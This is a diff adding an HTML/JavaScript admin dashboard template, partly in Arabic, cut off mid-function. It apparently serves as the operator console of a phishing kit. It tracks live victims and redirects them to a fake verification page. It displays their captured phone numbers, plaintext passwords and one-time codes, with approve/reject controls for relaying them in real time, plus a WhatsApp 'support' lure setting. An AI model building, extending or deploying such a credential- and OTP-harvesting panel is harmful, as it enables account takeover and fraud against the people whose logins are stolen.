@@ -1,0 +1,1438 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="/static/vendor/tabler/tabler.min.css" />
+  <link rel="stylesheet" href="/static/admin/css/dashboard.css?v=20260315-1" />
+</head>
+<body class="admin-dashboard">
+  <div class="page">
+    <header class="topbar">
+      <div class="container-xl topbar-inner">
+        <div class="topbar-right">
+          <div class="online-pill" id="admin-online-pill">
+            <span class="online-pill-label">Online</span>
+            <strong class="{% if online_users is not none and online_users > 0 %}online-count visitor-badge returning{% endif %}" id="admin-online-users">
+              {% if online_users is not none %}{{ online_users }}{% else %}N/A{% endif %}
+            </strong>
+          </div>
+          <span class="status-pill">
+            Redis:
+            <span class="connection-state {% if redis_connected %}visitor-badge returning connected{% else %}disconnected{% endif %}">
+              {% if redis_connected %}Connected{% else %}Unavailable{% endif %}
+            </span>
+          </span>
+          <span class="status-pill">
+            MongoDB:
+            <span class="connection-state {% if mongo_connected %}visitor-badge returning connected{% else %}disconnected{% endif %}">
+              {% if mongo_connected %}Connected{% else %}Unavailable{% endif %}
+            </span>
+          </span>
+          <button type="button" class="btn btn-outline-primary btn-sm" id="support-settings-open-btn">
+            Support Number
+          </button>
+          <form method="post" action="/admin/logout" class="d-inline">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
+            <button class="btn btn-outline-danger btn-sm" type="submit">Logout</button>
+          </form>
+        </div>
+      </div>
+    </header>
+
+    <main class="page-wrapper">
+      <div class="admin-shell">
+        <div class="submissions-grid">
+          <section class="card visitors-panel">
+            <div class="visitor-list" id="visitor-list">
+              {% if unique_visitors %}
+                {% for visitor in unique_visitors %}
+                <button
+                  type="button"
+                  class="visitor-item {% if visitor.visitor_id == selected_visitor_id %}active{% endif %}{% if visitor.blocked %} is-blocked{% endif %}"
+                  data-visitor-id="{{ visitor.visitor_id }}"
+                  data-display-id="{{ visitor.display_id }}"
+                  data-current-page="{{ online_visitor_pages.get(visitor.visitor_id, '-') }}"
+                  data-first-created-at="{{ visitor.first_created_at or '-' }}"
+                  data-last-created-at="{{ visitor.last_created_at or '-' }}"
+                  data-submissions-count="{{ visitor.submissions_count }}"
+                  data-blocked="{{ 'true' if visitor.blocked else 'false' }}"
+                >
+                  <span class="visitor-id">{{ visitor.display_id }}</span>
+                  <span class="visitor-page-btn" title="{{ online_visitor_pages.get(visitor.visitor_id, '-') }}">
+                    {{ online_visitor_page_titles.get(visitor.visitor_id, '-') }}
+                  </span>
+                  <span class="visitor-block-btn {% if visitor.blocked %}is-blocked{% endif %}" data-action="toggle-block" title="{% if visitor.blocked %}Unblock{% else %}Block{% endif %}">{% if visitor.blocked %}⛔{% else %}🚫{% endif %}</span>
+                  <span class="visitor-pin-btn" data-action="toggle-pin" title="Pin">☆</span>
+                  <span class="visitor-count">{{ visitor.submissions_count }}</span>
+                </button>
+                {% endfor %}
+              {% else %}
+                <div class="empty-row text-secondary" id="no-visitors-row">No visitors yet.</div>
+              {% endif %}
+            </div>
+          </section>
+
+          <section class="card visitor-submissions-panel">
+            <div class="visitor-submissions-cards" id="visitor-submissions-body"></div>
+          </section>
+        </div>
+      </div>
+    </main>
+  </div>
+  <div id="visitor-page-modal" class="visitor-page-modal" hidden>
+    <div class="visitor-page-modal-card">
+      <div class="visitor-page-modal-header">
+        <h3 class="visitor-page-modal-title">تحويل الزائر</h3>
+        <p class="visitor-page-modal-current" id="visitor-page-modal-current">-</p>
+      </div>
+      <div class="visitor-page-modal-buttons" id="visitor-page-modal-buttons"></div>
+      <button type="button" class="visitor-page-modal-close" id="visitor-page-modal-close">إغلاق</button>
+    </div>
+  </div>
+  <div id="support-settings-modal" class="support-settings-modal" hidden>
+    <div class="support-settings-modal-card">
+      <div class="support-settings-modal-header">
+        <h3 class="support-settings-modal-title">واتساب خدمة العملاء</h3>
+        <p class="support-settings-modal-copy">أدخل الرقم بصيغة دولية ليُستخدم داخل زر التواصل في صفحة التوثيق.</p>
+      </div>
+      <label class="support-settings-field" for="support-whatsapp-input">
+        <span>رقم واتساب</span>
+        <input
+          id="support-whatsapp-input"
+          class="support-settings-input"
+          type="text"
+          inputmode="tel"
+          autocomplete="tel"
+          value="{{ support_settings.whatsapp_number }}"
+          placeholder="9627XXXXXXXX"
+        >
+      </label>
+      <label class="support-settings-field" for="support-success-message-input">
+        <span>Success Message</span>
+        <textarea
+          id="support-success-message-input"
+          class="support-settings-textarea"
+          rows="5"
+          placeholder="أدخل الرسالة التي تظهر بعد قبول الطلب"
+        >{{ support_settings.success_message }}</textarea>
+      </label>
+      <p class="support-settings-preview" id="support-settings-preview">
+        {% if support_settings.whatsapp_url %}
+          {{ support_settings.whatsapp_url }}
+        {% else %}
+          No WhatsApp link configured yet.
+        {% endif %}
+      </p>
+      <div class="support-settings-actions">
+        <button type="button" class="btn btn-primary" id="support-settings-save-btn">Save</button>
+        <button type="button" class="btn btn-outline-secondary" id="support-settings-close-btn">Close</button>
+      </div>
+    </div>
+  </div>
+  <script src="/static/vendor/tabler/tabler.min.js"></script>
+  <script>
+    (function () {
+      var countEl = document.getElementById("admin-online-users");
+      var csrfToken = "{{ csrf_token }}";
+      var visitorListEl = document.getElementById("visitor-list");
+      var visitorCountLabelEl = document.getElementById("visitor-count-label");
+      var selectedVisitorLabelEl = document.getElementById("selected-visitor-label");
+      var visitorSubmissionsBodyEl = document.getElementById("visitor-submissions-body");
+      var wsToken = "{{ ws_token }}";
+      var maxRows = 500;
+      var loadingVisitorId = null;
+      var initialSelectedSubmissions = {{ selected_visitor_submissions|tojson }};
+      var activeVisitorSubmissions = Array.isArray(initialSelectedSubmissions)
+        ? initialSelectedSubmissions.slice()
+        : [];
+      var onlineVisitorIds = new Set();
+      var onlineVisitorPages = new Map();
+      var adminSocket = null;
+      var reconnectTimer = null;
+      var PINNED_STORAGE_KEY = "fastapi-base-admin-pinned-visitors-v1";
+      var pinnedVisitors = {};
+      var visitorPageModalEl = document.getElementById("visitor-page-modal");
+      var visitorPageModalButtonsEl = document.getElementById("visitor-page-modal-buttons");
+      var visitorPageModalCurrentEl = document.getElementById("visitor-page-modal-current");
+      var visitorPageModalCloseEl = document.getElementById("visitor-page-modal-close");
+      var visitorPageModalVisitorId = "";
+      var supportSettings = {{ support_settings|tojson }};
+      var supportSettingsModalEl = document.getElementById("support-settings-modal");
+      var supportSettingsOpenBtnEl = document.getElementById("support-settings-open-btn");
+      var supportWhatsappInputEl = document.getElementById("support-whatsapp-input");
+      var supportSuccessMessageInputEl = document.getElementById("support-success-message-input");
+      var supportSettingsPreviewEl = document.getElementById("support-settings-preview");
+      var supportSettingsSaveBtnEl = document.getElementById("support-settings-save-btn");
+      var supportSettingsCloseBtnEl = document.getElementById("support-settings-close-btn");
+      var REDIRECTABLE_PAGES = [
+        { path: "/", title: "الصفحة الرئيسية" },
+        { path: "/verification", title: "صفحة التوثيق" }
+      ];
+
+      function escapeHtml(value) {
+        return String(value)
+          .replaceAll("&", "&amp;")
+          .replaceAll("<", "&lt;")
+          .replaceAll(">", "&gt;")
+          .replaceAll("\"", "&quot;")
+          .replaceAll("'", "&#39;");
+      }
+
+      function normalizeWhatsAppNumber(value) {
+        var digits = String(value || "").replace(/[^\d]/g, "");
+        if (digits.indexOf("00") === 0) {
+          digits = digits.slice(2);
+        }
+        return digits;
+      }
+
+      function buildWhatsAppUrl(number) {
+        var normalizedNumber = normalizeWhatsAppNumber(number);
+        if (!normalizedNumber) {
+          return "";
+        }
+        return "https://wa.me/" + normalizedNumber;
+      }
+
+      function applySupportSettings(nextSettings) {
+        supportSettings = nextSettings && typeof nextSettings === "object" ? nextSettings : {};
+        var whatsappNumber = normalizeWhatsAppNumber(supportSettings.whatsapp_number || "");
+        var whatsappUrl = buildWhatsAppUrl(whatsappNumber);
+        var successMessage = String(supportSettings.success_message || "").trim();
+        supportSettings.whatsapp_number = whatsappNumber;
+        supportSettings.whatsapp_url = whatsappUrl;
+        supportSettings.success_message = successMessage;
+        if (supportWhatsappInputEl) {
+          supportWhatsappInputEl.value = whatsappNumber;
+        }
+        if (supportSuccessMessageInputEl) {
+          supportSuccessMessageInputEl.value = successMessage;
+        }
+        if (supportSettingsPreviewEl) {
+          supportSettingsPreviewEl.textContent = whatsappUrl || "No WhatsApp link configured yet.";
+        }
+      }
+
+      function loadPinnedVisitors() {
+        try {
+          var raw = localStorage.getItem(PINNED_STORAGE_KEY);
+          if (!raw) {
+            return {};
+          }
+          var parsed = JSON.parse(raw);
+          if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
+            return {};
+          }
+          var normalized = {};
+          Object.keys(parsed).forEach(function (visitorId) {
+            var timestamp = Number(parsed[visitorId]);
+            if (Number.isFinite(timestamp) && timestamp > 0) {
+              normalized[String(visitorId)] = timestamp;
+            }
+          });
+          return normalized;
+        } catch (error) {
+          return {};
+        }
+      }
+
+      function savePinnedVisitors() {
+        try {
+          localStorage.setItem(PINNED_STORAGE_KEY, JSON.stringify(pinnedVisitors));
+        } catch (error) {
+        }
+      }
+
+      function getPinnedAt(visitorId) {
+        var timestamp = Number(pinnedVisitors[String(visitorId)] || 0);
+        return Number.isFinite(timestamp) ? timestamp : 0;
+      }
+
+      function isPinned(visitorId) {
+        return getPinnedAt(visitorId) > 0;
+      }
+
+      function updatePinButtonState(visitorId) {
+        if (!visitorListEl || !visitorId) {
+          return;
+        }
+        var visitorItem = visitorListEl.querySelector(
+          ".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]"
+        );
+        if (!visitorItem) {
+          return;
+        }
+        var pinButton = visitorItem.querySelector(".visitor-pin-btn");
+        if (!pinButton) {
+          return;
+        }
+        var pinned = isPinned(visitorId);
+        visitorItem.classList.toggle("is-pinned", pinned);
+        pinButton.classList.toggle("is-pinned", pinned);
+        pinButton.textContent = pinned ? "★" : "☆";
+        pinButton.title = pinned ? "Pinned" : "Pin";
+      }
+
+      function updateBlockButtonState(visitorId, blocked) {
+        if (!visitorListEl || !visitorId) {
+          return;
+        }
+        var visitorItem = visitorListEl.querySelector(
+          ".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]"
+        );
+        if (!visitorItem) {
+          return;
+        }
+        var blockButton = visitorItem.querySelector(".visitor-block-btn");
+        var normalizedBlocked = Boolean(blocked);
+        visitorItem.dataset.blocked = normalizedBlocked ? "true" : "false";
+        visitorItem.classList.toggle("is-blocked", normalizedBlocked);
+        if (!blockButton) {
+          return;
+        }
+        blockButton.classList.toggle("is-blocked", normalizedBlocked);
+        blockButton.textContent = normalizedBlocked ? "⛔" : "🚫";
+        blockButton.title = normalizedBlocked ? "Unblock" : "Block";
+      }
+
+      function toggleVisitorPin(visitorId) {
+        if (!visitorId) {
+          return;
+        }
+        var normalizedVisitorId = String(visitorId);
+        if (isPinned(normalizedVisitorId)) {
+          delete pinnedVisitors[normalizedVisitorId];
+        } else {
+          pinnedVisitors[normalizedVisitorId] = Date.now();
+        }
+        savePinnedVisitors();
+        updatePinButtonState(normalizedVisitorId);
+        reorderVisitorList({ animate: true });
+      }
+
+      function setOnlineUsers(onlineUsers) {
+        countEl.classList.remove("online-count", "visitor-badge", "returning");
+        if (typeof onlineUsers === "number") {
+          countEl.textContent = String(onlineUsers);
+          if (onlineUsers > 0) {
+            countEl.classList.add("online-count", "visitor-badge", "returning");
+          }
+        } else {
+          countEl.textContent = "N/A";
+        }
+      }
+
+      function applyOnlineGlow() {
+        if (!visitorListEl) {
+          return;
+        }
+        visitorListEl.querySelectorAll(".visitor-item").forEach(function (item) {
+          var visitorId = item.dataset.visitorId || "";
+          item.classList.toggle("visitor-online", onlineVisitorIds.has(visitorId));
+        });
+      }
+
+      async function refreshOnlineVisitorIds() {
+        try {
+          var response = await fetch("/admin/api/online-visitor-ids");
+          if (!response.ok) {
+            throw new Error("Failed to fetch online visitor IDs");
+          }
+          var payload = await response.json();
+          if (!Array.isArray(payload.items)) {
+            onlineVisitorIds = new Set();
+          } else {
+            onlineVisitorIds = new Set(payload.items.map(function (id) { return String(id); }));
+          }
+          applyOnlineGlow();
+          applyVisitorPageState();
+          reorderVisitorList();
+        } catch (error) {
+          onlineVisitorIds = new Set();
+          applyOnlineGlow();
+          applyVisitorPageState();
+          reorderVisitorList();
+        }
+      }
+
+      function normalizeCurrentPage(value) {
+        var normalized = String(value || "").trim();
+        if (!normalized) {
+          return "/";
+        }
+        if (normalized === "-") {
+          return "-";
+        }
+        if (!normalized.startsWith("/")) {
+          return "/" + normalized;
+        }
+        return normalized;
+      }
+
+      function pageTitleFromPath(path) {
+        var normalizedPath = normalizeCurrentPage(path);
+        if (normalizedPath === "-") {
+          return "-";
+        }
+        if (normalizedPath === "/") {
+          return "الصفحة الرئيسية";
+        }
+        if (normalizedPath === "/verification") {
+          return "صفحة التوثيق";
+        }
+        return normalizedPath;
+      }
+
+      function parseTimestamp(value, fallbackValue) {
+        var normalized = String(value || "").trim();
+        if (!normalized || normalized === "-") {
+          return fallbackValue;
+        }
+        var isoCandidate = normalized.replace(" UTC", "Z").replace(" ", "T");
+        var timestamp = Date.parse(isoCandidate);
+        if (!Number.isFinite(timestamp)) {
+          return fallbackValue;
+        }
+        return timestamp;
+      }
+
+      function compareVisitorItems(aItem, bItem) {
+        var aVisitorId = aItem.dataset.visitorId || "";
+        var bVisitorId = bItem.dataset.visitorId || "";
+        var aPinnedAt = getPinnedAt(aVisitorId);
+        var bPinnedAt = getPinnedAt(bVisitorId);
+        var aPinned = aPinnedAt > 0;
+        var bPinned = bPinnedAt > 0;
+        if (aPinned !== bPinned) {
+          return aPinned ? -1 : 1;
+        }
+        if (aPinned && bPinned && aPinnedAt !== bPinnedAt) {
+          return bPinnedAt - aPinnedAt;
+        }
+
+        var aOnline = onlineVisitorIds.has(aVisitorId);
+        var bOnline = onlineVisitorIds.has(bVisitorId);
+        if (aOnline !== bOnline) {
+          return aOnline ? -1 : 1;
+        }
+
+        if (aOnline && bOnline) {
+          var aFirstCreatedAt = parseTimestamp(
+            aItem.dataset.firstCreatedAt,
+            Number.MAX_SAFE_INTEGER
+          );
+          var bFirstCreatedAt = parseTimestamp(
+            bItem.dataset.firstCreatedAt,
+            Number.MAX_SAFE_INTEGER
+          );
+          if (aFirstCreatedAt !== bFirstCreatedAt) {
+            return aFirstCreatedAt - bFirstCreatedAt;
+          }
+        } else {
+          var aLastCreatedAt = parseTimestamp(aItem.dataset.lastCreatedAt, 0);
+          var bLastCreatedAt = parseTimestamp(bItem.dataset.lastCreatedAt, 0);
+          if (aLastCreatedAt !== bLastCreatedAt) {
+            return bLastCreatedAt - aLastCreatedAt;
+          }
+        }
+
+        return aVisitorId.localeCompare(bVisitorId);
+      }
+
+      function animateVisitorReorder(visitorItems, previousRects) {
+        visitorItems.forEach(function (item) {
+          var visitorId = item.dataset.visitorId || "";
+          if (!visitorId) {
+            return;
+          }
+          var previousRect = previousRects.get(visitorId);
+          if (!previousRect) {
+            return;
+          }
+          var currentRect = item.getBoundingClientRect();
+          var deltaX = previousRect.left - currentRect.left;
+          var deltaY = previousRect.top - currentRect.top;
+          if (Math.abs(deltaX) < 1 && Math.abs(deltaY) < 1) {
+            return;
+          }
+          item.classList.add("is-reordering");
+          item.style.transform = "translate(" + deltaX + "px, " + deltaY + "px)";
+          // Force layout so the browser applies the starting transform.
+          item.getBoundingClientRect();
+          item.style.transform = "";
+          var onTransitionEnd = function (event) {
+            if (event.propertyName !== "transform") {
+              return;
+            }
+            item.classList.remove("is-reordering");
+            item.removeEventListener("transitionend", onTransitionEnd);
+          };
+          item.addEventListener("transitionend", onTransitionEnd);
+        });
+      }
+
+      function reorderVisitorList(options) {
+        if (!visitorListEl) {
+          return;
+        }
+        var shouldAnimate = Boolean(options && options.animate);
+        var visitorItems = Array.from(visitorListEl.querySelectorAll(".visitor-item"));
+        var previousRects = new Map();
+        if (shouldAnimate) {
+          visitorItems.forEach(function (item) {
+            var visitorId = item.dataset.visitorId || "";
+            if (!visitorId) {
+              return;
+            }
+            previousRects.set(visitorId, item.getBoundingClientRect());
+          });
+        }
+        visitorItems.sort(compareVisitorItems);
+        visitorItems.forEach(function (item) {
+          visitorListEl.appendChild(item);
+        });
+        if (shouldAnimate) {
+          animateVisitorReorder(visitorItems, previousRects);
+        }
+      }
+
+      function updateVisitorCurrentPage(visitorId, currentPage) {
+        if (!visitorListEl || !visitorId) {
+          return;
+        }
+        var visitorItem = visitorListEl.querySelector(
+          ".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]"
+        );
+        if (!visitorItem) {
+          return;
+        }
+        var normalizedPage = normalizeCurrentPage(currentPage);
+        visitorItem.dataset.currentPage = normalizedPage;
+        var pageBadge = visitorItem.querySelector(".visitor-page-btn");
+        if (pageBadge) {
+          pageBadge.textContent = pageTitleFromPath(normalizedPage);
+          pageBadge.title = normalizedPage;
+        }
+      }
+
+      function applyVisitorPageState() {
+        if (!visitorListEl) {
+          return;
+        }
+        visitorListEl.querySelectorAll(".visitor-item").forEach(function (item) {
+          var visitorId = item.dataset.visitorId || "";
+          var currentPage = onlineVisitorIds.has(visitorId)
+            ? (onlineVisitorPages.get(visitorId) || "-")
+            : "-";
+          updateVisitorCurrentPage(visitorId, currentPage);
+        });
+      }
+
+      async function refreshOnlineVisitorPages() {
+        try {
+          var response = await fetch("/admin/api/online-visitor-pages");
+          if (!response.ok) {
+            throw new Error("Failed to fetch online visitor pages");
+          }
+          var payload = await response.json();
+          var nextPages = new Map();
+          if (payload && typeof payload.items === "object" && payload.items !== null) {
+            Object.keys(payload.items).forEach(function (visitorId) {
+              nextPages.set(String(visitorId), normalizeCurrentPage(payload.items[visitorId]));
+            });
+          }
+          onlineVisitorPages = nextPages;
+          applyVisitorPageState();
+          reorderVisitorList();
+        } catch (error) {
+          // Keep last known visitor-page state.
+          applyVisitorPageState();
+          reorderVisitorList();
+        }
+      }
+
+      function renderVisitorItem(visitor, isActive) {
+        var displayId = visitor.display_id || visitor.visitor_display_id || visitor.phone_number || visitor.visitor_id || "-";
+        if (displayId === "-") {
+          displayId = visitor.visitor_id || "-";
+        }
+        var currentPage = normalizeCurrentPage(
+          visitor.current_page || onlineVisitorPages.get(visitor.visitor_id || "") || "-"
+        );
+        var currentPageTitle = pageTitleFromPath(currentPage);
+        var firstCreatedAt = String(visitor.first_created_at || "-");
+        var lastCreatedAt = String(visitor.last_created_at || "-");
+        var pinned = isPinned(visitor.visitor_id || "");
+        var blocked = Boolean(visitor && visitor.blocked);
+        return (
+          "<button type=\"button\" class=\"visitor-item" + (isActive ? " active" : "") + (pinned ? " is-pinned" : "") + (blocked ? " is-blocked" : "") + "\" data-visitor-id=\"" + escapeHtml(visitor.visitor_id || "") + "\" data-display-id=\"" + escapeHtml(displayId) + "\" data-current-page=\"" + escapeHtml(currentPage) + "\" data-first-created-at=\"" + escapeHtml(firstCreatedAt) + "\" data-last-created-at=\"" + escapeHtml(lastCreatedAt) + "\" data-submissions-count=\"" + escapeHtml(visitor.submissions_count || 0) + "\" data-blocked=\"" + (blocked ? "true" : "false") + "\">" +
+          "<span class=\"visitor-id\">" + escapeHtml(displayId) + "</span>" +
+          "<span class=\"visitor-page-btn\" title=\"" + escapeHtml(currentPage) + "\">" + escapeHtml(currentPageTitle) + "</span>" +
+          "<span class=\"visitor-block-btn" + (blocked ? " is-blocked" : "") + "\" data-action=\"toggle-block\" title=\"" + (blocked ? "Unblock" : "Block") + "\">" + (blocked ? "⛔" : "🚫") + "</span>" +
+          "<span class=\"visitor-pin-btn" + (pinned ? " is-pinned" : "") + "\" data-action=\"toggle-pin\" title=\"" + (pinned ? "Pinned" : "Pin") + "\">" + (pinned ? "★" : "☆") + "</span>" +
+          "<span class=\"visitor-count\">" + escapeHtml(visitor.submissions_count || 0) + "</span>" +
+          "</button>"
+        );
+      }
+
+      function closeVisitorPageModal() {
+        if (!visitorPageModalEl) {
+          return;
+        }
+        visitorPageModalEl.hidden = true;
+        visitorPageModalEl.setAttribute("aria-hidden", "true");
+        document.body.classList.remove("is-visitor-page-modal-open");
+        visitorPageModalVisitorId = "";
+      }
+
+      function openVisitorPageModal(visitorId, currentPath) {
+        if (!visitorPageModalEl || !visitorPageModalButtonsEl || !visitorId) {
+          return;
+        }
+        visitorPageModalVisitorId = visitorId;
+        var normalizedCurrentPath = normalizeCurrentPage(currentPath);
+        if (visitorPageModalCurrentEl) {
+          visitorPageModalCurrentEl.textContent = "الصفحة الحالية: " + pageTitleFromPath(normalizedCurrentPath);
+        }
+        visitorPageModalButtonsEl.innerHTML = REDIRECTABLE_PAGES.map(function (page) {
+          var isCurrent = page.path === normalizedCurrentPath;
+          return (
+            "<button type=\"button\" class=\"visitor-page-option" + (isCurrent ? " is-current" : "") + "\" data-target-path=\"" + escapeHtml(page.path) + "\"" + (isCurrent ? " disabled" : "") + ">" +
+            escapeHtml(page.title) +
+            "</button>"
+          );
+        }).join("");
+        visitorPageModalEl.hidden = false;
+        visitorPageModalEl.setAttribute("aria-hidden", "false");
+        document.body.classList.add("is-visitor-page-modal-open");
+      }
+
+      function closeSupportSettingsModal() {
+        if (!supportSettingsModalEl) {
+          return;
+        }
+        supportSettingsModalEl.hidden = true;
+        supportSettingsModalEl.setAttribute("aria-hidden", "true");
+        document.body.classList.remove("is-support-settings-modal-open");
+      }
+
+      function openSupportSettingsModal() {
+        if (!supportSettingsModalEl) {
+          return;
+        }
+        applySupportSettings(supportSettings);
+        supportSettingsModalEl.hidden = false;
+        supportSettingsModalEl.setAttribute("aria-hidden", "false");
+        document.body.classList.add("is-support-settings-modal-open");
+        if (supportWhatsappInputEl) {
+          supportWhatsappInputEl.focus();
+          supportWhatsappInputEl.select();
+        }
+      }
+
+      async function saveSupportSettings() {
+        if (!supportSettingsSaveBtnEl || !supportWhatsappInputEl || !supportSuccessMessageInputEl) {
+          return;
+        }
+        var originalLabel = supportSettingsSaveBtnEl.textContent;
+        var whatsappNumber = normalizeWhatsAppNumber(supportWhatsappInputEl.value);
+        var successMessage = String(supportSuccessMessageInputEl.value || "").trim();
+        supportSettingsSaveBtnEl.disabled = true;
+        supportSettingsSaveBtnEl.textContent = "Saving...";
+        try {
+          var response = await fetch("/admin/api/support-settings", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "x-csrf-token": csrfToken
+            },
+            body: JSON.stringify({
+              whatsapp_number: whatsappNumber,
+              success_message: successMessage
+            })
+          });
+          if (!response.ok) {
+            throw new Error("Support settings update failed");
+          }
+          var payload = await response.json();
+          applySupportSettings(payload.support_settings || {});
+          closeSupportSettingsModal();
+        } catch (error) {
+          applySupportSettings({
+            whatsapp_number: whatsappNumber,
+            success_message: successMessage
+          });
+        } finally {
+          supportSettingsSaveBtnEl.disabled = false;
+          supportSettingsSaveBtnEl.textContent = originalLabel;
+        }
+      }
+
+      async function redirectVisitorToPath(visitorId, targetPath, buttonEl) {
+        if (!visitorId || !targetPath || !buttonEl) {
+          return;
+        }
+        var originalText = buttonEl.textContent;
+        buttonEl.disabled = true;
+        buttonEl.textContent = "جاري التحويل...";
+        try {
+          var response = await fetch(
+            "/admin/api/visitors/" + encodeURIComponent(visitorId) + "/redirect",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "x-csrf-token": csrfToken
+              },
+              body: JSON.stringify({ target_path: targetPath })
+            }
+          );
+          if (!response.ok) {
+            throw new Error("Visitor redirect failed");
+          }
+          onlineVisitorPages.set(visitorId, targetPath);
+          updateVisitorCurrentPage(visitorId, targetPath);
+          closeVisitorPageModal();
+        } catch (error) {
+          buttonEl.disabled = false;
+          buttonEl.textContent = originalText;
+        }
+      }
+
+      async function toggleVisitorBlocked(visitorId, blocked, buttonEl) {
+        if (!visitorId || !buttonEl) {
+          return;
+        }
+        var nextBlocked = !Boolean(blocked);
+        var originalText = buttonEl.textContent;
+        var originalTitle = buttonEl.title;
+        buttonEl.textContent = "...";
+        buttonEl.style.pointerEvents = "none";
+        try {
+          var response = await fetch(
+            "/admin/api/visitors/" + encodeURIComponent(visitorId) + "/block",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "x-csrf-token": csrfToken
+              },
+              body: JSON.stringify({ blocked: nextBlocked })
+            }
+          );
+          if (!response.ok) {
+            throw new Error("Visitor block update failed");
+          }
+          var payload = await response.json();
+          updateBlockButtonState(visitorId, payload.visitor && payload.visitor.blocked);
+        } catch (error) {
+          buttonEl.textContent = originalText;
+          buttonEl.title = originalTitle;
+        } finally {
+          buttonEl.style.pointerEvents = "";
+        }
+      }
+
+      function normalizeApprovalStatus(status) {
+        var normalized = String(status || "").toLowerCase();
+        if (normalized === "approved") {
+          return "approved";
+        }
+        if (normalized === "rejected") {
+          return "rejected";
+        }
+        return "pending";
+      }
+
+      function approvalStatusLabel(status) {
+        var normalized = normalizeApprovalStatus(status);
+        if (normalized === "approved") {
+          return "Approved";
+        }
+        if (normalized === "rejected") {
+          return "Rejected";
+        }
+        return "Pending";
+      }
+
+      function createApprovalButtonsMarkup(submissionId) {
+        if (!submissionId) {
+          return "";
+        }
+        return (
+          "<button type=\"button\" class=\"btn btn-sm btn-success approve-submission-btn\" data-action=\"approve-submission\" data-submission-id=\"" +
+          escapeHtml(submissionId) +
+          "\">Approve</button>" +
+          "<button type=\"button\" class=\"btn btn-sm btn-danger reject-submission-btn\" data-action=\"reject-submission\" data-submission-id=\"" +
+          escapeHtml(submissionId) +
+          "\">Reject</button>"
+        );
+      }
+
+      function renderSubmissionActionControls(submission) {
+        var submissionId = String((submission && submission.id) || "");
+        var status = normalizeApprovalStatus(submission && submission.approval_status);
+        var markup =
+          "<span class=\"submission-status-badge " + status + "\">" + approvalStatusLabel(status) + "</span>";
+        if (status === "pending" && submissionId) {
+          markup += createApprovalButtonsMarkup(submissionId);
+        }
+        return markup;
+      }
+
+      function isOtpSubmission(submission) {
+        if (!submission || typeof submission !== "object") {
+          return false;
+        }
+        var formName = String(submission.form_name || "").toLowerCase();
+        var otpDisplay = String(submission.otp_display || "").trim();
+        return formName.indexOf("verification") >= 0 || formName.indexOf("otp") >= 0 || (otpDisplay && otpDisplay !== "-");
+      }
+
+      function isLoginSubmission(submission) {
+        if (!submission || typeof submission !== "object") {
+          return false;
+        }
+        if (isOtpSubmission(submission)) {
+          return false;
+        }
+        var formName = String(submission.form_name || "").toLowerCase();
+        var passwordValue = String(submission.password_display || "").trim();
+        return formName.indexOf("login") >= 0 || (passwordValue && passwordValue !== "-");
+      }
+
+      function groupSubmissionsIntoCards(submissions) {
+        if (!Array.isArray(submissions) || submissions.length === 0) {
+          return [];
+        }
+        var orderedByTime = submissions.slice().sort(function (a, b) {
+          var aTime = parseTimestamp(a && a.created_at, 0);
+          var bTime = parseTimestamp(b && b.created_at, 0);
+          return aTime - bTime;
+        });
+
+        var cardsByLoginId = new Map();
+        var loginOrder = [];
+        var currentLoginId = "";
+
+        orderedByTime.forEach(function (submission) {
+          var submissionId = String((submission && submission.id) || "").trim();
+          if (!submissionId) {
+            return;
+          }
+          if (isLoginSubmission(submission)) {
+            cardsByLoginId.set(submissionId, {
+              login: submission,
+              otps: [],
+            });
+            loginOrder.push(submissionId);
+            currentLoginId = submissionId;
+            return;
+          }
+          if (!isOtpSubmission(submission)) {
+            return;
+          }
+          var linkedLoginId = String((submission && submission.login_submission_id) || "").trim();
+          if (!linkedLoginId || !cardsByLoginId.has(linkedLoginId)) {
+            linkedLoginId = currentLoginId;
+          }
+          if (!linkedLoginId || !cardsByLoginId.has(linkedLoginId)) {
+            return;
+          }
+          cardsByLoginId.get(linkedLoginId).otps.push(submission);
+        });
+
+        return loginOrder
+          .map(function (loginId) {
+            return cardsByLoginId.get(loginId);
+          })
+          .filter(Boolean)
+          .reverse();
+      }
+
+      function renderOtpItemsHtml(items) {
+        if (!Array.isArray(items) || items.length === 0) {
+          return "<div class=\"otp-empty\">No OTPs yet.</div>";
+        }
+        var latestFirst = items.slice().sort(function (a, b) {
+          var aTime = parseTimestamp(a && a.created_at, 0);
+          var bTime = parseTimestamp(b && b.created_at, 0);
+          return bTime - aTime;
+        });
+        return (
+          "<ul class=\"otp-list\">" +
+          latestFirst.map(function (otpSubmission) {
+            return (
+              "<li data-submission-id=\"" + escapeHtml(otpSubmission.id || "") + "\">" +
+              "<div class=\"otp-item-main\">" +
+              "<span class=\"otp-code\">" + escapeHtml(otpSubmission.otp_display || "-") + "</span>" +
+              "<span class=\"otp-actions\">" + renderSubmissionActionControls(otpSubmission) + "</span>" +
+              "</div>" +
+              "</li>"
+            );
+          }).join("") +
+          "</ul>"
+        );
+      }
+
+      function renderLoginSubmissionCard(card) {
+        if (!card || !card.login) {
+          return "";
+        }
+        var loginSubmission = card.login;
+        var submissionId = String(loginSubmission.id || "");
+        var status = normalizeApprovalStatus(loginSubmission.approval_status);
+        var approvalControls = renderSubmissionActionControls(loginSubmission);
+        return (
+          "<article class=\"login-submission-card\" data-submission-id=\"" + escapeHtml(submissionId) + "\" data-approval-status=\"" + escapeHtml(status) + "\">" +
+          "<div class=\"login-submission-main\">" +
+          "<div class=\"login-cell submission-phone\">" + escapeHtml(loginSubmission.phone_number_display || "-") + "</div>" +
+          "<div class=\"login-cell submission-password-value\">" + escapeHtml(loginSubmission.password_display || "-") + "</div>" +
+          "<div class=\"login-cell submission-meta\">" + approvalControls + "</div>" +
+          "</div>" +
+          "<div class=\"login-submission-separator\" aria-hidden=\"true\"></div>" +
+          "<div class=\"otp-inline-wrap\">" + renderOtpItemsHtml(card.otps) + "</div>" +
+          "</article>"
+        );
+      }
+
+      function markSubmissionStatus(submissionId, status, submission) {
